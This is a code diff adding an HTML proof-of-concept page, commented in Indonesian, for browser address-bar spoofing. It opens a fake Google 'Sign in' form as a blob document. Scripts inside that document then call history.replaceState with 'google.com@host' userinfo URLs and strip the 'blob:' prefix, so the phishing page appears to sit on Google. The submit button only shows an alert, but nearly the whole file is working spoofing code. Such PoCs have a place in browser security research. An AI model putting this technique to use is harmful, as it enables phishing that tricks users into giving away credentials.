@@ -1,9 +1,110 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PoC URL Spoof (hide "blob:")</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 20px; line-height:1.5 }
+    pre { background:#f3f3f3; padding:12px; border-radius:8px; overflow:auto }
+    button { padding:10px 14px; border-radius:8px; border:1px solid #ccc; background:#fff }
+  </style>
+</head>
+<body>
+  <h2>PoC: URL-Spoof (try hide "blob:")</h2>
+  <p>Tekan tombol untuk membuka payload (blob) dan mencoba mengganti URL yang terlihat tanpa menampilkan literal <code>blob:</code>.</p>
+  <button id="go">Buka PoC</button>
+  <p><strong>Catatan:</strong> Keberhasilan tergantung versi/browser (iOS WebView / Safari / Chrome behavior berbeda).</p>
+
+  <h3>Log</h3>
+  <pre id="log">ready...</pre>
+
 <script>
-var exp = '<h1>fake Login</h1><script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
-location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
+const L = id => document.getElementById(id);
+function log(...s){ L('log').textContent += '\n' + s.join(' '); }
+
+// Payload HTML yang ingin ditampilkan (apa pun boleh)
+const payloadHTML = `
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <title>Fake Login</title>
+    <style>body{font-family:system-ui;padding:30px;background:#fff} .box{max-width:420px;margin:40px auto;border:1px solid #ddd;padding:18px;border-radius:10px} input{display:block;width:100%;margin:8px 0;padding:8px}</style>
+  </head>
+  <body>
+    <div class="box">
+      <h2>Sign in</h2>
+      <p>Masukkan kredensial (PoC)</p>
+      <input placeholder="Email / Username"/>
+      <input placeholder="Password"/>
+      <button onclick="alert('submitted')">Submit</button>
+    </div>
+
+    <script>
+      // Di dalam dokumen blob — tempat kita mencoba replaceState
+      function trySpoof() {
+        try {
+          // 1) Coba set full absolute URL (sering diblock modern browsers)
+          history.replaceState(null, '', 'https://www.google.com/');
+        } catch (e) {
+          // ignored
+        }
+
+        try {
+          // 2) Fallback: teknik "userinfo" — tampilkan `https://google.com@victim.com`
+          // Banyak browser akan menampilkan bagian setelah terakhir '@' sebagai host nyata,
+          // sehingga yang terlihat bisa menipu pengguna awam.
+          const fake = 'https://www.google.com@' + location.host + '/';
+          history.replaceState(null, '', fake);
+        } catch (e) {
+          // ignored
+        }
+
+        try {
+          // 3) Beberapa implementasi (old WebViews) menampilkan string yang diberikan utuh.
+          // Coba juga menghilangkan prefiks "blob:" kalau mungkin.
+          const alt = location.href.replace(/^blob:/i, '');
+          history.replaceState(null, '', alt);
+        } catch (e) {
+          // ignored
+        }
+
+        // optional: force scroll/hide to make address bar stable in mobile
+        try { window.scrollTo(0,1); } catch(e){}
+      }
+
+      // jalankan segera setelah load
+      window.addEventListener('load', function(){
+        setTimeout(trySpoof, 50);
+        // ulangi beberapa kali karena timing race di beberapa WebView
+        setTimeout(trySpoof, 300);
+        setTimeout(trySpoof, 800);
+      }, false);
+    <\/script>
+  </body>
+</html>
+`;
+
+// fungsi untuk membuat blob dan navigate
+async function openPoC() {
+  log('Mempersiapkan payload...');
+  const blob = new Blob([payloadHTML], {type: 'text/html'});
+  const url = URL.createObjectURL(blob);
+  log('blob url created:', url);
+
+  // 1) Buka di tab yang sama (location = ...)
+  //    Ini adalah skenario paling umum (document blob terbuka dan script di dalamnya akan menjalankan replaceState).
+  log('Navigasi ke blob (sama tab)...');
+  location = url;
+
+  // ALTERNATIF: buka di window baru
+  // const w = window.open(url, '_blank');
+  // if (w) log('opened new window/tab');
+  // else log('popup blocked');
+}
+
+L('go').addEventListener('click', openPoC);
 </script>
-
-
-
-
-
+</body>
+</html>
